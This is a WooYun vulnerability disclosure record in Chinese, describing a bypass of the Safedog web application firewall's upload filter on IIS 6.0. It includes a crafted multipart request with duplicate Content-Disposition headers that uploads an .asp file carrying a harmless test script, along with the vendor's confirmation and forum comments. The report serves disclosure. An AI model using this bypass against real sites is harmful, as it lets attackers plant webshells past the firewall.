{"id": 73670, "wybug_id": "wooyun-2015-0162291", "wybug_title": "网站安全狗WebShell上传拦截Bypass", "wybug_corp": "安全狗", "wybug_author": "RedFree", "wybug_date": "2015-12-18 09:41", "wybug_open_date": "2016-01-28 17:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计错误", "设计缺陷", "安全狗"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向公众公开  简要描述： 网站安全狗在对上传请求处理时存在缺陷，从而导致对诸如.asp .asa等后缀的上传拦截失效。 详细说明：  测试环境：IIS 6.0安全狗（最新版）：\n\n尝试上传asp文件，被拦截:\n\n尝试构造如下的多个Content-Disposition去请求[被拦截]：\nC:\\Inetpub\\wwwroot......省略-----------------------------15377259221471Content-Disposition: form-data; name=\"FileUploadName\"; filename=\"test.txt\"-----------------------------15377259221471Content-Disposition: form-data; name=\"FileUploadName\"; filename=\"test.asp\"Content-Type: application/octet-stream......省略\n\n\n经过对IIS 6.0的测试发现，其总是采用第一个Content-Disposition中的值做为接收参数，而安全狗总是以最后一个Content-Disposition中的值做为接收参数。因此尝试构造如下请求[上传test.asp成功]：\n......省略-----------------------------15377259221471Content-Disposition: form-data; name=\"FileUploadPath\"C:\\Inetpub\\wwwroot-----------------------------15377259221471Content-Disposition: form-data; name=\"FileUploadName\"; filename=\"test.asp\"-----------------------------15377259221471Content-Disposition: form-data; name=\"FileUploadName\"; filename=\"test.txt\"Content-Type: application/octet-stream<%response.write(\"bypass safedog!\")%>-----------------------------15377259221471--......省略\n成功绕过了安全狗的上传拦截！\n\n\n\n   漏洞证明：  \n\n   修复方案：  检查任何Content-Disposition的内容。   版权声明：转载请注明来源 RedFree@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-12-18 10:49 厂商回复： 非常感谢，问题存在，开发忙起来。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-18 09:53 |    \t\t殺器王子 \t\t\t( 普通白帽子  |\t\t\t        Rank:245 漏洞数:12        | 磨刀霍霍向猪羊，手握殺器日天下)\t\t \n  红老师出手了    \n     2015-12-18 09:58 |    \t\t势必1日脚踩乌云 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 乌云的白帽子都是大煞笔乌云的白帽子都是...)\t\t \n  呦 红老师腻害    \n     2015-12-18 10:27 |    \t\txbuther \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 多多交流，一起进步。。。O(∩_∩)O~)\t\t \n  mark    \n     2015-12-18 10:30 |    \t\t進撃のDanny \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:13        | 一个用来刷洞的小马甲)\t\t \n  顶 红老师。    \n     2015-12-18 10:33 |    \t\t坏男孩-A_A \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:11        | 膜拜学习中)\t\t \n  顶 红老师。    \n     2015-12-18 10:40 |    \t\t酷帥王子 \t\t\t( 普通白帽子  |\t\t\t        Rank:222 漏洞数:62        | 天人合一，乃屌神也！)\t\t \n  虐狗大侠，曾虐过纯种藏獒，警犬，特种犬，一一被虐死    \n     2015-12-18 10:45 |    \t\t1c3z \t\t\t( 普通白帽子  |\t\t\t        Rank:264 漏洞数:55        | #)\t\t \n  然后一访问就被拦截了    \n     2015-12-18 11:25 |    \t\tSai、 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | for fun……)\t\t \n  红老师日狗一百年啊一百年……    \n     2016-01-07 12:03 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:285 漏洞数:48        | little red pig!)\t\t \n  赞！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}